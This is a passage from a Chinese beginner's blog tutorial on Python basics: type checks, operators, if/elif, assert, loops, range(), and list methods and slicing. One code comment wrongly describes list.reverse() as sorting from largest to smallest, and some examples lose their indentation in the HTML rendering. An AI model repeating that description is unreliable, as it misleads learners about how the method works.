class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> c<span class="token string">'5.99'</span></code></pre><p>他就会自动在数字上加单引号<br><strong>查看数据类型</strong><br>上一篇文章我写到了一种，type()函数。可以查看一下，现在还有一种方法，就是使用<code>isinstance()</code>函数。话不多说看示例：</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token operator">>></span><span class="token operator">></span> <span class="token function">isinstance</span><span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">)</span>True<span class="token operator">>></span><span class="token operator">></span> <span class="token function">isinstance</span><span class="token punctuation">(</span><span class="token number">520.1314</span><span class="token punctuation">,</span>float<span class="token punctuation">)</span>True<span class="token operator">>></span><span class="token operator">></span> <span class="token function">isinstance</span><span class="token punctuation">(</span><span class="token string">'lixinjie'</span><span class="token punctuation">,</span>str<span class="token punctuation">)</span>True<span class="token operator">>></span><span class="token operator">></span> <span class="token function">isinstance</span><span class="token punctuation">(</span>True<span class="token punctuation">,</span><span class="token builtin">bool</span><span class="token punctuation">)</span>True<span class="token operator">>></span><span class="token operator">></span> <span class="token function">isinstance</span><span class="token punctuation">(</span><span class="token number">520</span><span class="token punctuation">,</span>float<span class="token punctuation">)</span>False</code></pre><p>如果是相应的数据类型就会回复True，不是就回复False<br><strong>算数运算</strong><br>关于算数运算，我上篇博客也只是写到算数运算符而已，这次写下怎么使用。还是老规矩，直接上实例：</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> b <span class="token operator">=</span> c <span class="token operator">=</span>d <span class="token operator">=</span> <span class="token number">10</span><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">+=</span> <span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> b <span class="token operator">-=</span> <span class="token number">3</span><span class="token operator">>></span><span class="token operator">></span> c <span class="token operator">*=</span> <span class="token number">10</span><span class="token operator">>></span><span class="token operator">></span> d <span class="token operator">/=</span> <span class="token number">8</span><span class="token operator">>></span><span class="token operator">></span> a<span class="token number">11</span><span class="token operator">>></span><span class="token operator">></span> b<span class="token number">7</span><span class="token operator">>></span><span class="token operator">></span> c<span class="token number">100</span><span class="token operator">>></span><span class="token operator">></span> d<span class="token number">1.25</span><span class="token operator">>></span><span class="token operator">></span> <span class="token number">10</span> <span class="token comment">// 8</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> <span class="token number">3.0</span> <span class="token comment">// 2</span><span class="token number">1.0</span><span class="token operator">>></span><span class="token operator">></span> <span class="token number">5</span> <span class="token operator">%</span> <span class="token number">2</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> <span class="token number">3</span> <span class="token operator">*</span><span class="token operator">*</span> <span class="token number">2</span><span class="token number">9</span><span class="token operator">>></span><span class="token operator">></span> <span class="token number">3</span> <span class="token operator">*</span><span class="token operator">*</span> <span class="token number">5</span><span class="token number">243</span></code></pre><p>如果混合运算的话，害，记住一句亘古不变的话（说个高级点的词汇装下X，哈哈哈）：先乘除，后加减！<br>哎，对了，我还借了（我们都是IT学习爱好者，这不能说偷知道吗，，，，）小甲鱼一张图片。<br><img src="https://img-blog.csdnimg.cn/20200218230816551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>哈哈哈，过瘾，感觉这样学真不错。<br><strong>逻辑操作符</strong><br><code>and</code>、<code>or</code>、<code>not</code><br>老规矩，看示例：</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">1</span> <span class="token operator">></span> <span class="token number">2</span> and <span class="token number">3</span> <span class="token operator">&lt;</span> <span class="token number">4</span>False<span class="token operator">>></span><span class="token operator">></span> <span class="token number">1</span> <span class="token operator">></span> <span class="token number">2</span> or <span class="token number">3</span> <span class="token operator">&lt;</span> <span class="token number">4</span>True<span class="token operator">>></span><span class="token operator">></span> not TrueFalse<span class="token operator">>></span><span class="token operator">></span> not FalseTrue</code></pre><p>哈哈哈，，例子真的比语言易懂！！！<br>反正我这么学感觉挺好，哈哈哈，希望对你们有一点点的帮助哈，一起学习，一起进步。<br>溜了溜了！！！！</p><h1 id="分支和循环"><a href="#分支和循环" class="headerlink" title="分支和循环"></a>分支和循环</h1><h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><p>在C语言里，学过<strong>if</strong>语句，Python中的<strong>if</strong>语句和C语言的差不多，老规矩，直接上示例：如果编写百分制学生成绩评分，分为‘A’、‘B’、‘C’、‘D’几个等级，那么可以怎么写呢？？？？？？</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 第一种：</span>score <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入一个学生的分数：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token number">100</span> <span class="token operator">>=</span> score <span class="token operator">>=</span> <span class="token number">90</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token number">90</span> <span class="token operator">></span> score <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token number">80</span> <span class="token operator">></span> score <span class="token operator">>=</span> <span class="token number">60</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'C'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token number">60</span> <span class="token operator">></span> score <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'D'</span><span class="token punctuation">)</span><span class="token keyword">if</span> score <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span> score <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入错误'</span><span class="token punctuation">)</span></code></pre><p>这样看起来有点低级，不过这很像C语言中的<strong>if</strong>，很容易理解，不过有更简便的，看第二种：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 第二种：</span>score <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入一个学生的分数：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token number">100</span> <span class="token operator">>=</span> score <span class="token operator">>=</span> <span class="token number">90</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token number">90</span> <span class="token operator">></span> score <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token number">80</span> <span class="token operator">></span> score <span class="token operator">>=</span> <span class="token number">60</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'C'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token number">60</span> <span class="token operator">></span> score <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'D'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入错误'</span><span class="token punctuation">)</span></code></pre><p>这个看起来就有点不一样了，害，你品，你细品，当然，他们俩都不是今天的主角，主角是它：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 第三种，它是今天的靓仔：</span>score <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入一个学生的分数：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token number">100</span> <span class="token operator">>=</span> score <span class="token operator">>=</span> <span class="token number">90</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> <span class="token number">90</span> <span class="token operator">></span> score <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> <span class="token number">80</span> <span class="token operator">></span> score <span class="token operator">>=</span> <span class="token number">60</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'C'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> <span class="token number">60</span> <span class="token operator">></span> score <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'D'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入错误'</span><span class="token punctuation">)</span></code></pre><p>在Python中，比较常用的就是<code>if ···elif···else</code>这个也是Python跟C语言不同的地方，这里还体现出来Python的一个特点：简洁！！！仔细对比这三个代码，觉得那种适合自己就用哪种，毕竟编程语言没有最好的，只有最适合的。</p><h3 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h3><p>断言呢，一个小知识点，什么是断言？？？<code>assert</code>这个关键字我们称之为“<strong>断言</strong>”，当这个关键字后面跟的条件为假时，程序自动崩溃并抛出<code>AssertionError</code>的异常，举个例子：<code>assert 3 &gt; 4</code>,看下结果：<br><img src="https://img-blog.csdnimg.cn/20200221233850930.png" alt="在这里插入图片描述" loading="lazy"><br>我刚看到这个东西的时候第一时间想的是，这有什么用啊，让系统崩溃？？？？？写程序不就是为了让它能够好好的运行吗？？为什么还要设置让它自动崩溃的步骤呢？？？？当时就一个字——<strong>迷</strong>！！<br>原因：一般都是拿它插在程序里，当做检查点。当需要确保一个程序的一个条件一定为真才能让程序正常工作的话，assert就很有用了。哦。。。原来还能这么用啊，真是学到了，还是想的方面太狭窄，没有往其他方面扩展。</p><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>循环是很重要的，在任何一种编程语言当中，它都极其重要，它可以减少程序员写代码的时间，遇到使代码更加简洁。</p><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><p>for循环的结构：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> 目标 <span class="token keyword">in</span> 表达式    循环体</code></pre><p>老规矩，先看个示例：<br><img src="https://img-blog.csdnimg.cn/20200222001107588.png" alt="在这里插入图片描述" loading="lazy"><br>这里我拿money做个例子，实不相瞒，我就是喜欢money，嘿嘿！！！<br>这里可能会有人对那个<code>end=</code>有点不理解，看着有点懵B,咳咳，因为我就是这样的人……至于他是什么呢，我再举个例子就明白了：<br><img src="https://img-blog.csdnimg.cn/20200222001513642.png" alt="在这里插入图片描述" loading="lazy"><br>看看看看，对比一下，哪里不一样啦？？？？它换行了，有了那个<code>end</code>，就不会换行了，如果没有<code>end</code>在Python里，它是默认换行的。<br>再看一个做下比较：<br><img src="https://img-blog.csdnimg.cn/20200222002303116.png" alt="在这里插入图片描述" loading="lazy"><br>这个<code>[ ]</code>嘛，就跟C语言中的数组类似，这里知道就行，后面再说。<br>len 是长度，这个也到后面再提。<br>这个代码的意思是对于member里的每一项，都使用列表打印出来，并且显示出来这个字符串的长度。<br><strong>range()</strong><br>语法：<code>range([start],stop,[step=1])</code><br>这个BIF有三个参数，其中<strong>带中括号的参数是可选的</strong><br>step=1，表示这第三个参数默认值是1<br>range这个BIF的作用是生成一个从start参数值开始到stop参数值结束的一个数字序列。老规矩，上示例：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token comment"># 列出来康康：</span><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span></code></pre><p>range()，跟for经常连在一块用，<br><img src="https://img-blog.csdnimg.cn/20200222004731981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>看看这几个示例就清楚了，！！！</p><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><p>while循环其实，没什么，因为它跟C语言很像，几乎没什么不同，也没什么可说的。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span>  条件     循环体</code></pre><h5 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h5><p><strong>break</strong><br>这个不会陌生，它在循环里的作用是跳出循环，这个应该不需要解释。<br><strong>continue</strong><br>这个的意思就是，如果符合条件的话，它以下的语句就不执行了。<br>看个代码，</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> i<span class="token operator">%</span><span class="token number">2</span> <span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">continue</span>i <span class="token operator">+=</span> <span class="token number">2</span><span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre><p>这是个数字小游戏，不妨先看看，在脑袋里过一遍这个代码，想想会输出什么，下面有答案：<br><img src="https://img-blog.csdnimg.cn/20200222010844100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>看看答案，跟想的一样不一样，不一样的话就再好好看下代码，多看几遍；一样的话就证明已经理解了。</p><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>Python里面没有数组一说，而代替数组作用的有个新名字，叫做<strong>列表</strong>。<br>数组要求你放在数组里的数据类型必须一致，整型就放整型，字符串就放字符串，不能混合放置。<br>列表也可以理解为是一个强大的数组，但不能说是数组，Python没有数组，有的只是列表。列表可以放各种不同的数据，功能比较强大。<br>首先，先创建一个普通的列表，老规矩：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 简单列表：</span><span class="token operator">>></span><span class="token operator">></span> member <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'中国加油'</span><span class="token punctuation">,</span><span class="token string">'武汉加油'</span><span class="token punctuation">,</span><span class="token string">'白衣天使加油'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">[</span><span class="token string">'中国加油'</span><span class="token punctuation">,</span> <span class="token string">'武汉加油'</span><span class="token punctuation">,</span> <span class="token string">'白衣天使加油'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> member <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span></code></pre><p>列表可以起C语言中数组的作用。可以放字符串，也可以放数字。当然，也可以放其他的……<br>再创建一个混合列表：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#混合列表；</span><span class="token operator">>></span><span class="token operator">></span> mix <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'zxcv0221'</span><span class="token punctuation">,</span><span class="token number">3.1415926</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> mix<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'zxcv0221'</span><span class="token punctuation">,</span> <span class="token number">3.1415926</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><p>这个列表就很强，可以放整型数字，还可以放浮点型、字符串，也看到了，还可以在里面再放一个列表。<br>还可以创建一个空列表</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> empty <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> empty<span class="token punctuation">[</span><span class="token punctuation">]</span></code></pre><p>这个就是个空列表。<br>那么，如何向列表中添加元素呢？？？？？Python当然它的办法，<br>第一种方法：<br>这个时候用到一个函数，名字叫做<code>append()</code>具体怎么用呢？？说再多也不如直接看例子来的好，嘿嘿（为我懒得打字找个理由）！！！</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'添加项1'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'添加项1'</span><span class="token punctuation">]</span></code></pre><p>加上了，哈哈哈。那我再来试试，这次我添加两个，嘿嘿<br><img src="https://img-blog.csdnimg.cn/20200222132653167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>哎？？？一次只能添加一个？？好吧，这个函数看来能力有限，没关系，还有第二种，要相信大佬人总会想各种方法偷懒，嘿嘿，当然会有更简便的方法；<br>extend函数，这个是可以添加多个的它的使用方法跟append有点稍微不同；<br>看下示例：<br><img src="https://img-blog.csdnimg.cn/20200222133742962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>成功啦，，，看出来了吗？？？？这个函数在列表里添加元素要加中括号，这个是在列表里添加列表元素。。。。这样不就好起来了嘛。<br>那么看了这两个例子，有没有发现一个问题，我添加进列表的元素都是排在后面的，这是默认的，但是我想把它排在第一位，现在就再添加一个元素，这次我要让它排老大。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'我要排第一！'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">[</span><span class="token string">'我要排第一！'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'添加项1'</span><span class="token punctuation">,</span> <span class="token string">'添加项2'</span><span class="token punctuation">,</span> <span class="token string">'添加项3'</span><span class="token punctuation">]</span></code></pre><p>哈哈哈，排第一了，insert()函数，可以自己选择插入位置，这个函数有两个参数，第一个参数定位置。当然这里我用<strong>0</strong>,应该没有异议，哈哈哈，毕竟我们学编程的眼里的第“一”位是0<br>那么现在我就不想让它在第一个，我要想办法给他换到其他位置，怎么做，<br>老规矩；<br><img src="https://img-blog.csdnimg.cn/20200222224918663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>你想排第一？，哈哈哈我就不让你排第一，倒数第一去吧。。。<br>上面的换位方法和其他编程语言类似，找个空的值，先将一个值存在这个空值里，再换位。<br><strong>删除元素</strong><br>也是三种方法：<br>1.<code>remove()</code>删除一个元素，删除谁呢？emmmmm 那就删了那个想排第一的吧，嘿嘿！</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'我要排第一！'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">[</span><span class="token string">'添加项3'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'添加项1'</span><span class="token punctuation">,</span> <span class="token string">'添加项2'</span><span class="token punctuation">]</span><span class="token comment">#好，已经删除了</span></code></pre><p>注意：如果同一列表中有两个相同的元素，那么使用此函数，默认删除从左到右数第一个元素。<br>2.del语句<br>del就是delete的缩写，用法看下面</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">del</span> member<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'添加项1'</span><span class="token punctuation">,</span> <span class="token string">'添加项2'</span><span class="token punctuation">]</span></code></pre><p>这里我又把第0位的那个删除了。可以自定义想要删除的元素参数。<br>3.pop()<br>pop()函数是有一个参数的，如果不添加参数，默认删除最后一个元素。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'添加项2'</span><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'添加项1'</span><span class="token punctuation">]</span></code></pre><p>看第二行代码，删除之前，它会显示将要删除的那个元素。Python还是很人性化的。。<br>当然也可以想删哪个删哪个。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token string">'添加项1'</span><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span></code></pre><p>现在这个列表已经被删的就剩数字元素了。<br><strong>列表分片</strong><br>这个不好描述，老规矩：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> member<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span></code></pre><p>先看第一个，member[1:3]分出来member的第一位，到第三位，但是这个中括号是左闭右开，数学中的术语，就是左边是可以取到，而右边不能取到。<strong>注意：这里说的第一位是2，毕竟0才是第一个嘛</strong><br>第二个，前面那个参数没有设置，那就默认全都有了，第三个跟第二个类似。<br>第四个，左右两边都没有参数，相当于一个列表的拷贝，讲原来的列表拷贝一份。</p><h4 id="与列表连用的函数"><a href="#与列表连用的函数" class="headerlink" title="与列表连用的函数"></a>与列表连用的函数</h4><p>与列表连用的函数有很多，可以输入<code>dir list</code>就可以查看<br><img src="https://img-blog.csdnimg.cn/20200222235616154.png" alt="在这里插入图片描述" loading="lazy"><br>这里就不一一举例了，因为我也就会几种而已<br><img src="https://img-blog.csdnimg.cn/20200222235946715.jpg" alt="在这里插入图片描述" loading="lazy"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span><span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#将列表中的元素从大到小排列</span><span class="token builtin">list</span><span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#讲列表中的元素从小到大排列</span><span class="token builtin">list</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#参数有一个，计算该参数在上面出现的次数</span><span class="token builtin">list</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#参数三个，（信息，开始位置，结束位置）找出想找到的信息所在的位置</span></code></pre><p>下面还有一些列表的比较好玩的用法</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">456</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> list1 <span class="token operator">></span> list2<span class="token boolean">False</span>             <span class="token comment">#从这里可以看出来列表也可以比较大小</span><span class="token operator">>></span><span class="token operator">></span> list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">456</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">234</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token 